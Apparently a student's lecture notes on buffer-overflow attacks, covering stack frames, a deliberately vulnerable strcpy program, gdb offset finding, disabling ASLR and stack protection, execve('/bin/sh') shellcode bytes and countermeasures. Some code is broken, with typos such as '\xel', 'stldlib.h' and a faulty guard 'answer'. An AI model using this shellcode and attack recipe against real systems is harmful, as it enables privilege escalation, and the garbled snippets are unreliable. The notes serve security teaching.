# Week 2 Buffer-Overflow Attacks and Countermeasures
## Directory
- [Home](/README.md#table-of-contents)
- [Week 1 Set-UID Programs](/week1/README.md#Week-1-set-uid-programs)
- **&rarr;[Week 2 Buffer-Overflow Attacks and Countermeasures](/week2/README.md#Week-2-buffer-overflow-attacks-and-countermeasures)**
- [Week 3 Race Condition Attacks and "Dirty Cow"](/week3/README.md#Week-3-race-condition-attacks-and-dirty-cow)

## 2.2 Buffer-Overflow Attacks and Countermeasures
([top](#directory))

- have a buffer and you overflow the buffer

## 2.3 Stack Layout
([top](#directory))

```C
int x=100;
int main(){
    // data stored on stack
    int a = 2;
    float b=2.5;
    static y;

    // allocate memory on heap
    int *ptr = (int *) malloc(2*sizeof(int));

    // values 5 and 6 stored on heap
    ptr[1]=5;
    ptr[2]=6;

    free(ptr);
    return 1
}
```

- global static
    - BSS Segment: not initialized
    - Data Segment: 

### Virtual Address vs Physical Address

p1 0x5000
p2 0x5000
same virtual memory addresses map to different physical memory addresses (real memory)

### Stack Layout

#### Stack Frame

```C
void func(int a, int b){
    int x,y;
    x=a+b;
    y=a-b;
}

func(5,6)
```
- stack frame for `func()`

|stack frame for func|
|-|
|b:6 (ebp+12)|
|a:5 (ebp+8|
|return address|
|previous frame pointer|
|local variable x,y|
|x=ebp-8|
|...|

- frame pointer is the register that compiler uses to know the address of the variables inside stack frame

#### Frame Pointer
*ebp is the stack frame pointer!
```
movl 12(%ebp), %eax
movl 8(%epb), %edx
addl %edx, %eax
movl %eax, -8(%ebp)
```

### Frame Pointer and Function Call Chain


call chain: `main() --> foo() --> bar()`
|stack||
|-|-|
|main() stack frame|<-ebp|
|foo()|<-main ebp|
|bar()|<-foo ebp|

## 2.4 Buffer-Overflow Vulnerability

### Copy Data to Buffer
```C
#include <string.h>
#include <stdio.h>

void main(){
    char src[40]="hello world \0 extra string";
    char dest[40];

    //copy to dest (destination) from src (source)
    strcpy(dest, src);
}
```

### Buffer Overflow

```C
#include <string.h>

void foo(char *str){
    char buffer[12];

    // the following statement will result in buffer overflow
    strcpy(buffer, str);
}

int main(){
    char *str = "this is definitely longer than 12"
    foo(str);

    return 1;
}
```

|||
|-|-|
|str|(bufferoverflow)|
|return address|(bufferoverflow)|
|previous fp|ebp...(bufferoverflow)|
||(bufferoverflow)|
|buffer[11]||
|buffer[...]||
|buffer[1]||
|buffer[0]||

#### Question
How can we use the return address so we don't crash the program?
Want the program to jump to my program.

|||
|-|-|
|main() stack frame||
|str|(bufferoverflow)|
|return address|(bufferoverflow)|
|previous frame ptr|ebp...(bufferoverflow)|
|buffer[11]||
|buffer[...]||
|buffer[0]||

|||
|-|-|
|main() stack frame||
|str|(bufferoverflow)|
|return address|(bufferoverflow) [address of malicious code]|
|previous frame ptr|(bufferoverflow)|
|buffer[11]||
|buffer[...]||
|buffer[0]||

## 2.5 Launch the Attack
([top](#directory))

### Example of a Vulnerable Program

```C
/* stack.c */
/* this program has a buffer overflow vulnerability
our task is to exploid this vulnerability*/

#include <stldlib.h>
#include <stdio.h>
#include <string.h>

int foo(char *str)
{
    char buffer[100];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer,str);
    return 1;
}

int main(int argc, char **argv){
    char str[400];
    FILE *badfile;

    badfile = fopen("badfile","r");
    fread(str, sizeof(char), 200, badfile);
    foo(str);

    printf("returned properly\n");
    return 1;
}
```


### Challenges

|||
|-|-|
|X address||
|...||
|`0x90`||
|`0x90`||
|`foo()`|&darr;|
|return address||
|...||
|buffer|&uarr;|


|bad file||
|-|-|
|malicious code||
|||
|`0x90`||
|`0x90`||
|malicious address X|2. x?|
|...|1. distance|
|||

challenges:
1. distance
2. x address value

`nop: 0x90`

### Finding the Offset and Address
#### Running GDB

 we have to disable several countermeasures for this to work
```
$ gcc -z execstack -fno-stack-protector -g -o stack_dbg stack.c
$ touch badfile
$ gdb stack_dbg
```

#### Finding the Address
```
(gdb) p $ebp
$1 = (void *)0xbffff188
(gdb) p &buffer
$2 = (char (*)[100]) 0xbffff11c
(gdb) p 0xbffff188 - oxbffff11c
$3 = 108
(gdb) quit
```

|||
|-|-|
|return address|ebp+4=112|
|-|ebp|
|buffer[n]||
|buffer[...]|distance 108|
|buffer[0]||

### Constructiong the Array

|`NOP`|`NOP`|---|`RT`|`NOP`|---|`NOP`|`Malicious Code`|
|-|-|-|-|-|-|-|-|
||||`ebp + 8`||||

|||
|-|-|
|`NOP`|&uarr;|
|`NOP`||
|`RT`|ebp + 4s|
|-|ebp value|

## 2.6 Demonstration: Buffer-Overflow Attack
([top](#directory))
disable the randomize memory countermeasure
```sh
$ sudo sysctl -w kernel.randomize_va_space=0
$
```

## 2.7 Shellcode
([top](#directory))

### Writing Schellcode (Malicious Code): The Difficulties

### Writing shellcode using C

```C
#include <stddef.h>
void main(){
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```
c program -> binary -> malicious code
```
$ gcc shellcode.c
$ ls -la a.out
```

### Shellcode Example

```asm
const char code[]=
"\x31\xc0"     /* xorl  %eax,%eax    */
"\x50"         /* pushl %eax         */
"\x68""//sh"   /* pushl $0x68732f2f  */
"\x68""//bin"  /* pushl $0x6e69622f  */
"\x89\xe3"     /* movl  %esp,%ebx    */
"\x50"         /* pushl %eax         */
"\x53"         /* pushl %ebx         */
"\x89\xel"     /* movl  %esp,%ecx    */
"\x99"         /* cdq                */
"\xb0\x0b"     /* movb  $0x0b,%al    */
"\xcd\x80"     /* int   $0x80        */
```

0x80 is a system call
|||
|-|-|
|`0x0b->%a1`|`execve`|
|`ebx`|`cmd`|
|`ecx`|`argv[]`|
|`edx`|`0`|

`execve(cmd,arv[],0)`

|||
|-|-|
|esp|&rarr;|
||0|
|ebx|/bin//sh|
|esp|&rarr;|
||argv[1]=0|
||argv[0]=ebx|
|esp|&rarr;|
|||


ebx->"/bin/sh"

## 2.8 Countermeasures
([top](#directory))

### Developer Approach

- use safe libraries

These are not safe
- strcpy
- sprintf
- strcat
- get

These are safe
- strncpy
- snprintf
- strncat
- fgets

- User safer language
  - java

- tools
  - scan your program

### OS Approach 1: Address Space Layout Randomization


||
|-|
|malicous code|
|....|
|Return Address RT|

make it more dificult to **guess** the address of the malicous code

### ASLR Case Study

```c
#include <stdio.h>
#include <stdlib.h>

void main()
{
    char x[12];
    char *y = malloc(sizeof(char)*12);

    printf("address of buffer x (on stack): 0x%x\n", x);
    printf("address of buffer y (on heap): 0x%x\n", y);
}
```
```
$ sudo sysctl -w kernel.randomize_va_space=0 #turn off
$ sudo sysctl -w kernel.randomize_va_space=1 #stack
$ sudo sysctl -w kernel.randomize_va_space=2 #stack and heap
```


```bash
#!/bin/bash

SECONDS=0
value=0
while [1]
  do
  value=$(( $value + 1))
  duration=$SECONDS
  echo "$(($duration/60)) minutes and $(($duration %60)) seconds elapsed"
  echo "The program has been running $value times so far."
  ./stack
done
```

## 2.9 Nonexecutable Stack
([top](#directory))

- another countermeasure

### Nonexecutable stack

#### Code on the stack

```
/* shellcode.c*/
#include <string.h>

const char code[]=
    "\x31\xc0\x50\x68//sh\x86/bin"
    "\x89\xe3\x50\x53\x89\xe1\x99"
    "\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
    char buffer[sizeof(code)];
    strcpy(buffer, code);
    ((void(*)( ))buffer) ( );
}
```

stack: *data*
||
|-|
|code|

```
$ gcc -z execstack shellcode.c //allow running code on stack
$ ./a.out
$ new shell!
$ gcc -z noexecstack shellcode.c //disallow running ocde on stack
$ ./a.out
```

#### Return-to-libc Attack

## 2.10 StackGuard
([top](#directory))

### Compiler Approach: Stack Guard

|||
|-|-|
|||
|RT|need to overflow to here|
||guard here|
|||
|buffer[...]||
|buffer[0]||

can you modify the program below so even if buffer overflow happens, the program is still safe?

```c
int checksum=random();
void foo (char *str)
{
    int x=checksum;
    char buffer[12];
    strcpy (buffer, str);
    if(&x!=&checksum){
        exit(0);
    }
    return;
}

```

#### Answer

```c
void foo (char *str)
{
    int guard;
    guard=x;
    char buffer[12];
    if(guard==x){
        return;
    }else{
        error;
    }
}
```

#### Exercise 2

```C
void func(char *str){
    int guard;
    int *secret = malloc(sizeof(int));
    *secret = generateRandomNumber();
    guard=*secret;

    char buffer[12];
    strcpy(buffer,str);
    if(guard!=*secret) exit;

    return;
}
```
Is this safe?
No because the secret pointer is vulnerable to being changed to the location of the guard.

**Guard is implemented in compiler**


## 2.11 Summary
([top](#directory))
- Memory layout in function invocation
- buffer overflow
- how to exploit buffer-overflow vulnerabilities
- countermeasures


# Week 2 Live Session
